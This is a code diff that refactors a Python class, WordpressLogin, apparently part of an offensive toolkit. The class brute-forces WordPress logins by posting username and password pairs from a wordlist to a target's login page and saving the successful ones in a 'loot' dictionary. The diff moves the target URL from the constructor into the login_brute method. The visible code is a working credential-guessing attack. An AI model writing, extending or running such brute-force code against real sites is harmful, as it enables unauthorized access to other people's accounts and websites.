@@ -6,8 +6,8 @@ from filehandler import read_list
 
 
 class WordpressLogin:
-    def __init__(self, target: str):
-        self.target: str = target
+    def __init__(self):
+        self.target: str | None = None
         self.user = None
         self.password = None
         self.loot: dict = {}
@@ -34,6 +34,7 @@ class WordpressLogin:
 
     def login_brute(
         self,
+        target: str,
         user: str | None = None,
         password: str | None = None,
         passlist: str | None = None,
@@ -75,7 +76,7 @@ class WordpressLogin:
 
         s = requests.Session()
         try:
-            login_page = s.get(self.target)
+            login_page = s.get(target)
             login_page.raise_for_status()
         except requests.exceptions.HTTPError as e:
             print(f"Could not retrieve login site: {e}")
@@ -85,7 +86,7 @@ class WordpressLogin:
             params["log"] = u
             for p in passwords:
                 params["pwd"] = p
-                t = s.post(self.target, data=params)
+                t = s.post(target, data=params)
                 if "Welcome to WordPress!" in t.text:
                     self.loot[user] = p
                     loot[user] = p
